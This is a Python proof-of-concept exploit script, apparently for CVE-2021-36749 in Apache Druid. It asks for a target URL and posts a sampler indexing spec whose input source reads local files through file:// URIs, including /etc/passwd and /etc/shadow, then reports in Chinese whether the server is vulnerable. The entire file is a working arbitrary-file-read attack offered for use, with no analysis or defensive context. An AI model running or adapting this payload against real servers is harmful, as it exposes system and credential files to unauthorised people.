import requests
import sys
import pyfiglet

def POC(url):
    paths = [
        #Linux
        "file://etc/passwd",
        "file://etc/hosts",
        "file://etc/shadow",
        #windows
        "file://C:/Windows/system.ini"
    ]
    
    headers = {
    "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    }

    try:
        for i in paths:
            datas = {"type":"index","spec":{"type":"index","ioConfig":{"type":"index","inputSource":{"type":"http","uris":[i]},"inputFormat":{"type":"regex","pattern":"(.*)","columns":["raw"]}},"dataSchema":{"dataSource":"sample","timestampSpec":{"column":"!!!_no_such_column_!!!","missingValue":"1970-01-01T00:00:00Z"},"dimensionsSpec":{}},"tuningConfig":{"type":"index"}},"samplerConfig":{"numRows":500,"timeoutMs":15000}}
            request = requests.post(url=url,json=datas,headers=headers)

            if "root" in request.text:
                print("[+] 存在 Apache Druid LoadData 任意文件读取漏洞 ")
                break
            else:
                print("[-] 不存在 Apache Druid LoadData 任意文件读取漏洞")
                break
    except Exception as e:
        print("Error!!!!")

def main():
    font = pyfiglet.figlet_format("CVE-2021-36749", font="slant")
    print(font)
    sys.stdout.reconfigure(encoding='utf-8')
    url = input("请输入目标url： ")
    POC(url)
    #http://localhost:8888/druid/indexer/v1/sampler?for=connect

if __name__ == '__main__':
    main()
